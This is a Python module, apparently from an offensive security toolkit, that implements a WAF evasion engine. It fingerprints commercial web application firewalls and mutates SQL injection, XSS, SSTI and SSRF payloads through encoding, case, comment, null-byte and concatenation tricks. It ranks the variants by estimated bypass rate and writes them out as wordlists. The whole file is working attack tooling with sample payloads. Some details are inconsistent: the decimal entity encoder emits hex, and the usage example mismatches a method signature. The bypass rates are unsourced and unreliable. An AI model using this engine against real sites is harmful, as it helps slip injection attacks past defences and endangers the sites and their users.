"""
WAF Evasion Engine — modules/intelligence/waf_evasion.py

Transforms blocked payloads into WAF-bypassing variants using
encoding mutations, case manipulation, fragmentation, and
protocol-level tricks.

Evasion techniques (30+):
  Encoding:
    - URL encode (single + double)
    - Unicode encode (%u0041)
    - HTML entity encode (&lt; &#60; &#x3C;)
    - Base64 encode (for injection contexts)
    - Hex encode (\x3c \x41)
    - Octal encode (\074)

  Case manipulation:
    - Mixed case (SeLeCt)
    - Alternating case (sElEcT)
    - All upper / all lower

  Whitespace tricks:
    - Tab substitution (\t)
    - Newline injection (\n \r\n)
    - Multi-space (%20%20)
    - Comment injection (/**/, --, #)
    - Null byte injection (%00)

  Fragmentation:
    - String concatenation (MySQL CONCAT, Oracle ||)
    - CHAR() function injection
    - Hex string (0x48454C4C4F)

  Protocol tricks:
    - HTTP parameter pollution (?q=safe&q=payload)
    - Content-Type switching (JSON vs form-data)
    - Chunked encoding simulation
    - Wildcard bypass (e.g. SEL/**/ECT)

  SQLi-specific:
    - OR 1=1 variants
    - Comment styles (--, #, /**/, %23, %2d%2d)
    - Keyword replacement (UNION -> UN/**/ION)

  XSS-specific:
    - Event handler alternatives
    - SVG/MathML vectors
    - Template literals
    - CSS injection

  Detection:
    - WAF fingerprinting (Cloudflare, ModSecurity, Akamai, AWS WAF)
    - Block signature analysis
    - Adaptive bypass selection

Usage:
    from modules.intelligence.waf_evasion import WAFEvasionEngine

    engine = WAFEvasionEngine()
    variants = engine.evade("' OR '1'='1", technique="all", attack_type="sqli")
    # Returns list of encoded variants to try

    # Auto-detect WAF and suggest best bypass
    waf_type = engine.fingerprint_waf("https://target.com")
    bypasses = engine.smart_bypass("' OR '1'='1", waf_type, "sqli")

Author: ardanov96
"""

import re
import base64
import urllib.parse
import html
from dataclasses import dataclass, field
from rich.console import Console

console = Console()


# ── WAF signatures ────────────────────────────────────────

WAF_SIGNATURES: dict[str, list[str]] = {
    "Cloudflare": [
        "cloudflare", "cf-ray", "__cfduid",
        "error 1010", "error 1020", "attention required",
    ],
    "ModSecurity": [
        "modsecurity", "mod_security", "406 not acceptable",
        "not acceptable!", "406 - not acceptable",
    ],
    "Akamai": [
        "akamai", "reference #", "access denied",
        "ghost1.0", "akamaierror",
    ],
    "AWS WAF": [
        "aws waf", "x-amzn-requestid", "403 forbidden",
        "request blocked",
    ],
    "Imperva": [
        "incapsula", "visid_incap", "x-iinfo",
        "_incap_ses",
    ],
    "Sucuri": [
        "sucuri", "x-sucuri-id", "sucuri cloudproxy",
        "access denied - sucuri",
    ],
    "F5 BIG-IP": [
        "bigip", "ts=", "f5_cspm", "x-cnection",
    ],
    "Barracuda": [
        "barracuda", "bni__cookie", "bniz",
    ],
    "Generic": [
        "web application firewall", "waf", "blocked",
        "security violation", "illegal request",
    ],
}

# Bypass effectiveness by WAF type (based on research)
WAF_BYPASS_PRIORITY: dict[str, list[str]] = {
    "Cloudflare":   ["unicode", "case_mixed", "comment_inline", "url_double"],
    "ModSecurity":  ["comment_inline", "whitespace_tab", "hex_encode", "char_func"],
    "Akamai":       ["url_double", "unicode", "case_alternating", "null_byte"],
    "AWS WAF":      ["case_mixed", "comment_inline", "url_single", "unicode"],
    "Imperva":      ["unicode", "html_entity", "url_double", "case_mixed"],
    "Generic":      ["url_single", "case_mixed", "comment_inline", "unicode"],
}


# ── Evasion technique definitions ────────────────────────

@dataclass
class EvasionVariant:
    """A single evasion-encoded variant of a payload."""
    original: str
    encoded: str
    technique: str
    technique_description: str
    attack_type: str
    estimated_bypass_rate: float   # 0.0-1.0 estimate

    def __eq__(self, other):
        return isinstance(other, EvasionVariant) and self.encoded == other.encoded

    def __hash__(self):
        return hash(self.encoded)


# ── Encoding functions ────────────────────────────────────

class Encoder:
    """Collection of encoding/evasion transformation functions."""

    @staticmethod
    def url_encode_single(s: str) -> str:
        """URL encode once: ' -> %27"""
        return urllib.parse.quote(s, safe="")

    @staticmethod
    def url_encode_double(s: str) -> str:
        """Double URL encode: ' -> %2527"""
        return urllib.parse.quote(urllib.parse.quote(s, safe=""), safe="")

    @staticmethod
    def url_encode_partial(s: str) -> str:
        """Encode only special chars, leave alphanumeric."""
        result = ""
        for c in s:
            if c.isalnum() or c in " _-":
                result += c
            else:
                result += urllib.parse.quote(c, safe="")
        return result

    @staticmethod
    def unicode_encode(s: str) -> str:
        """Unicode encode non-alphanumeric: ' -> %u0027"""
        result = ""
        for c in s:
            if c.isalnum() or c == " ":
                result += c
            else:
                result += f"%u{ord(c):04X}"
        return result

    @staticmethod
    def html_entity_named(s: str) -> str:
        """HTML entity encode: < -> &lt; > -> &gt;"""
        return html.escape(s)

    @staticmethod
    def html_entity_decimal(s: str) -> str:
        """HTML decimal encode: < -> &#60;"""
        return "".join(f"&#x{ord(c):X};" if not c.isalnum() else c for c in s)

    @staticmethod
    def html_entity_hex(s: str) -> str:
        """HTML hex encode: < -> &#x3C;"""
        return "".join(f"&#x{ord(c):X};" if not c.isalnum() else c for c in s)

    @staticmethod
    def hex_encode(s: str) -> str:
        """Hex encode all chars: A -> \\x41"""
        return "".join(f"\\x{ord(c):02x}" for c in s)

    @staticmethod
    def hex_string(s: str) -> str:
        """MySQL hex string: 'hello' -> 0x68656c6c6f"""
        return "0x" + s.encode().hex()

    @staticmethod
    def base64_encode(s: str) -> str:
        """Base64 encode: useful for some injection contexts."""
        return base64.b64encode(s.encode()).decode()

    @staticmethod
    def char_function(s: str) -> str:
        """Convert string to CHAR() function call: 'A' -> CHAR(65)"""
        chars = ",".join(str(ord(c)) for c in s)
        return f"CHAR({chars})"

    @staticmethod
    def case_upper(s: str) -> str:
        return s.upper()

    @staticmethod
    def case_lower(s: str) -> str:
        return s.lower()

    @staticmethod
    def case_mixed(s: str) -> str:
        """Alternating case: SELECT -> SeLeCt"""
        return "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(s))

    @staticmethod
    def case_alternating(s: str) -> str:
        """Alternating case starting lower: sElEcT"""
        return "".join(c.lower() if i % 2 == 0 else c.upper() for i, c in enumerate(s))

    @staticmethod
    def whitespace_tab(s: str) -> str:
        """Replace spaces with tabs."""
        return s.replace(" ", "\t")

    @staticmethod
    def whitespace_newline(s: str) -> str:
        """Replace spaces with newlines."""
        return s.replace(" ", "\n")

    @staticmethod
    def whitespace_multi(s: str) -> str:
        """Replace spaces with multiple spaces."""
        return s.replace(" ", "  ")

    @staticmethod
    def comment_inline(s: str, style: str = "/**/") -> str:
        """Replace spaces with inline comments."""
        return s.replace(" ", style)

    @staticmethod
    def comment_between_keywords(s: str) -> str:
        """Inject comments between SQL keywords: SELECT -> SEL/**/ECT"""
        keywords = ["SELECT", "UNION", "WHERE", "FROM", "AND", "OR", "INSERT", "DROP"]
        result = s
        for kw in keywords:
            if kw in result.upper():
                mid = len(kw) // 2
                broken = kw[:mid] + "/**/" + kw[mid:]
                result = re.sub(kw, broken, result, flags=re.IGNORECASE)
        return result

    @staticmethod
    def null_byte(s: str) -> str:
        """Inject null bytes: payload%00extra"""
        return s + "%00"

    @staticmethod
    def null_byte_prefix(s: str) -> str:
        """Null byte prefix: %00payload"""
        return "%00" + s

    @staticmethod
    def concat_mysql(s: str) -> str:
        """MySQL CONCAT to split strings: 'test' -> CONCAT('te','st')"""
        if len(s) < 2:
            return s
        mid = len(s) // 2
        return f"CONCAT('{s[:mid]}','{s[mid:]}')"

    @staticmethod
    def concat_oracle(s: str) -> str:
        """Oracle concat: 'test' -> 'te'||'st'"""
        if len(s) < 2:
            return s
        mid = len(s) // 2
        return f"'{s[:mid]}'||'{s[mid:]}'"

    @staticmethod
    def comment_hash(s: str) -> str:
        """Replace -- comments with #"""
        return s.replace("--", "#")

    @staticmethod
    def comment_url_encode(s: str) -> str:
        """URL encode comment chars: -- -> %2d%2d"""
        return s.replace("--", "%2d%2d").replace("#", "%23")

    @staticmethod
    def xss_svg(payload: str) -> str:
        """Wrap payload in SVG onload."""
        return f"<svg onload={payload}>"

    @staticmethod
    def xss_img_onerror(payload: str) -> str:
        """XSS via img onerror."""
        return f'<img src=x onerror={payload}>'

    @staticmethod
    def xss_template_literal(s: str) -> str:
        """JavaScript template literal to bypass quote filters."""
        return s.replace("'", "`").replace('"', "`")

    @staticmethod
    def xss_fromcharcode(s: str) -> str:
        """String.fromCharCode for XSS: alert(1) -> eval(String.fromCharCode(97,108,101,114,116,40,49,41))"""
        codes = ",".join(str(ord(c)) for c in s)
        return f"eval(String.fromCharCode({codes}))"


# ── WAF Evasion Engine ────────────────────────────────────

class WAFEvasionEngine:
    """
    Comprehensive WAF evasion payload generator.

    Takes a base payload and generates encoded variants
    likely to bypass different WAF implementations.
    """

    # All available techniques
    TECHNIQUES: dict[str, tuple] = {
        # (function_name, description, estimated_bypass_rate)
        "url_single":        ("url_encode_single",    "URL encode (single)",          0.55),
        "url_double":        ("url_encode_double",    "URL encode (double)",          0.65),
        "url_partial":       ("url_encode_partial",   "URL encode (partial)",         0.50),
        "unicode":           ("unicode_encode",       "Unicode encode (%uXXXX)",      0.70),
        "html_named":        ("html_entity_named",    "HTML entity (named)",          0.45),
        "html_decimal":      ("html_entity_decimal",  "HTML entity (decimal &#XX;)",  0.55),
        "html_hex":          ("html_entity_hex",      "HTML entity (hex &#xXX;)",     0.55),
        "hex_encode":        ("hex_encode",           "Hex encode (\\xXX)",           0.60),
        "hex_string":        ("hex_string",           "MySQL hex string (0x...)",     0.65),
        "base64":            ("base64_encode",        "Base64 encode",                0.40),
        "char_func":         ("char_function",        "CHAR() function",              0.70),
        "case_upper":        ("case_upper",           "Uppercase",                    0.35),
        "case_lower":        ("case_lower",           "Lowercase",                    0.35),
        "case_mixed":        ("case_mixed",           "Mixed case (SeLeCt)",          0.60),
        "case_alternating":  ("case_alternating",     "Alternating case (sElEcT)",    0.55),
        "whitespace_tab":    ("whitespace_tab",       "Tab whitespace",               0.65),
        "whitespace_newline":("whitespace_newline",   "Newline whitespace",           0.55),
        "whitespace_multi":  ("whitespace_multi",     "Multi-space",                  0.45),
        "comment_inline":    ("comment_inline",       "Inline comment (/**/ )",       0.75),
        "comment_between":   ("comment_between_keywords","Comment in keywords",       0.70),
        "null_byte":         ("null_byte",            "Null byte suffix (%00)",       0.55),
        "null_byte_prefix":  ("null_byte_prefix",     "Null byte prefix (%00)",       0.50),
        "concat_mysql":      ("concat_mysql",         "MySQL CONCAT()",               0.65),
        "concat_oracle":     ("concat_oracle",        "Oracle || concat",             0.60),
        "comment_hash":      ("comment_hash",         "Hash comment (#)",             0.50),
        "comment_urlencode": ("comment_url_encode",   "URL-encoded comment (%2d%2d)", 0.60),
        "xss_svg":           ("xss_svg",              "SVG onload wrapper",           0.65),
        "xss_img":           ("xss_img_onerror",      "IMG onerror wrapper",          0.60),
        "xss_template":      ("xss_template_literal", "Template literal (backtick)",  0.55),
        "xss_fromcharcode":  ("xss_fromcharcode",     "String.fromCharCode()",        0.70),
    }

    # Which techniques apply per attack type
    ATTACK_TECHNIQUES: dict[str, list[str]] = {
        "sqli": [
            "url_single", "url_double", "unicode", "hex_encode", "hex_string",
            "char_func", "case_mixed", "case_alternating", "whitespace_tab",
            "comment_inline", "comment_between", "null_byte", "concat_mysql",
            "concat_oracle", "comment_hash", "comment_urlencode",
        ],
        "xss": [
            "url_single", "url_double", "unicode", "html_named", "html_decimal",
            "html_hex", "hex_encode", "base64", "case_mixed",
            "xss_svg", "xss_img", "xss_template", "xss_fromcharcode",
            "null_byte", "whitespace_tab",
        ],
        "ssti": [
            "url_single", "url_double", "unicode", "hex_encode",
            "case_mixed", "whitespace_tab", "null_byte",
        ],
        "ssrf": [
            "url_single", "url_double", "url_partial", "unicode",
            "hex_encode", "null_byte",
        ],
        "generic": [
            "url_single", "url_double", "unicode", "case_mixed",
            "comment_inline", "whitespace_tab", "null_byte",
        ],
    }

    def evade(
        self,
        payload: str,
        attack_type: str = "generic",
        technique: str = "all",
        max_variants: int = 20,
    ) -> list[EvasionVariant]:
        """
        Generate evasion variants of a payload.

        Args:
            payload:      Original payload to encode
            attack_type:  sqli | xss | ssti | ssrf | generic
            technique:    specific technique name, or "all" for all applicable
            max_variants: maximum variants to return

        Returns:
            List of EvasionVariant objects, sorted by bypass rate desc
        """
        if technique == "all":
            techniques = self.ATTACK_TECHNIQUES.get(
                attack_type,
                self.ATTACK_TECHNIQUES["generic"],
            )
        else:
            techniques = [technique] if technique in self.TECHNIQUES else []

        variants = set()
        for tech_name in techniques:
            if tech_name not in self.TECHNIQUES:
                continue

            fn_name, description, bypass_rate = self.TECHNIQUES[tech_name]

            # Get encoder function
            fn = getattr(Encoder, fn_name, None)
            if not fn:
                continue

            try:
                encoded = fn(payload)
                if encoded and encoded != payload:
                    variants.add(EvasionVariant(
                        original=payload,
                        encoded=encoded,
                        technique=tech_name,
                        technique_description=description,
                        attack_type=attack_type,
                        estimated_bypass_rate=bypass_rate,
                    ))
            except Exception:
                continue

        sorted_variants = sorted(
            variants,
            key=lambda v: v.estimated_bypass_rate,
            reverse=True,
        )
        return sorted_variants[:max_variants]

    def fingerprint_waf(self, response_headers: dict, response_body: str) -> str:
        """
        Detect WAF type from HTTP response headers and body.

        Args:
            response_headers: dict of response headers (lowercase keys)
            response_body:    response body text

        Returns:
            Detected WAF name, or "Unknown"
        """
        combined = " ".join(response_headers.values()).lower()
        combined += " " + response_body.lower()

        for waf_name, signatures in WAF_SIGNATURES.items():
            if waf_name == "Generic":
                continue
            if any(sig in combined for sig in signatures):
                return waf_name

        # Check generic last
        if any(sig in combined for sig in WAF_SIGNATURES["Generic"]):
            return "Generic WAF"

        return "Unknown"

    def is_blocked(self, status_code: int, response_body: str) -> bool:
        """Determine if a response indicates WAF blocking."""
        if status_code in (403, 406, 429, 503):
            return True
        body_lower = response_body.lower()
        block_phrases = [
            "blocked", "forbidden", "access denied", "not acceptable",
            "security", "waf", "firewall", "rejected", "illegal request",
        ]
        return any(phrase in body_lower for phrase in block_phrases)

    def smart_bypass(
        self,
        payload: str,
        waf_type: str,
        attack_type: str = "generic",
        max_variants: int = 10,
    ) -> list[EvasionVariant]:
        """
        Generate WAF-specific bypass variants ordered by effectiveness.

        Args:
            payload:      Original blocked payload
            waf_type:     WAF name from fingerprint_waf()
            attack_type:  sqli | xss | ssti | ssrf | generic
            max_variants: max variants to return

        Returns:
            Variants ordered by likely effectiveness against this WAF
        """
        priority_techniques = WAF_BYPASS_PRIORITY.get(waf_type, WAF_BYPASS_PRIORITY["Generic"])
        applicable = self.ATTACK_TECHNIQUES.get(attack_type, self.ATTACK_TECHNIQUES["generic"])

        # Prioritized techniques first
        ordered_techniques = [t for t in priority_techniques if t in applicable]
        remaining = [t for t in applicable if t not in ordered_techniques]
        all_techniques = ordered_techniques + remaining

        variants = []
        seen = set()
        for tech in all_techniques:
            if tech not in self.TECHNIQUES:
                continue
            fn_name, description, bypass_rate = self.TECHNIQUES[tech]
            fn = getattr(Encoder, fn_name, None)
            if not fn:
                continue
            try:
                encoded = fn(payload)
                if encoded and encoded != payload and encoded not in seen:
                    seen.add(encoded)
                    # Boost rate for WAF-prioritized techniques
                    effective_rate = bypass_rate + 0.1 if tech in priority_techniques else bypass_rate
                    variants.append(EvasionVariant(
                        original=payload,
                        encoded=encoded,
                        technique=tech,
                        technique_description=description,
                        attack_type=attack_type,
                        estimated_bypass_rate=min(1.0, effective_rate),
                    ))
            except Exception:
                continue

        return sorted(variants, key=lambda v: v.estimated_bypass_rate, reverse=True)[:max_variants]

    def generate_wordlist(
        self,
        base_payloads: list[str],
        attack_type: str = "sqli",
        output_file: str | None = None,
    ) -> list[str]:
        """
        Generate evasion wordlist from base payloads.
        Optionally write to file for use with other tools.

        Args:
            base_payloads: list of original payloads
            attack_type:   sqli | xss | ssti | ssrf | generic
            output_file:   optional path to write wordlist

        Returns:
            Flat list of all encoded variants
        """
        all_encoded = []
        seen = set()

        for payload in base_payloads:
            variants = self.evade(payload, attack_type=attack_type)
            for v in variants:
                if v.encoded not in seen:
                    seen.add(v.encoded)
                    all_encoded.append(v.encoded)

        if output_file:
            from pathlib import Path
            Path(output_file).write_text("\n".join(all_encoded), encoding="utf-8")
            console.print(f"  Wordlist saved: [cyan]{output_file}[/cyan] ({len(all_encoded)} entries)")

        return all_encoded

    def describe_techniques(self, attack_type: str = "sqli") -> list[dict]:
        """List all techniques available for an attack type."""
        techniques = self.ATTACK_TECHNIQUES.get(attack_type, self.ATTACK_TECHNIQUES["generic"])
        result = []
        for name in techniques:
            if name in self.TECHNIQUES:
                fn_name, description, bypass_rate = self.TECHNIQUES[name]
                result.append({
                    "name":        name,
                    "description": description,
                    "bypass_rate": bypass_rate,
                })
        return sorted(result, key=lambda t: t["bypass_rate"], reverse=True)
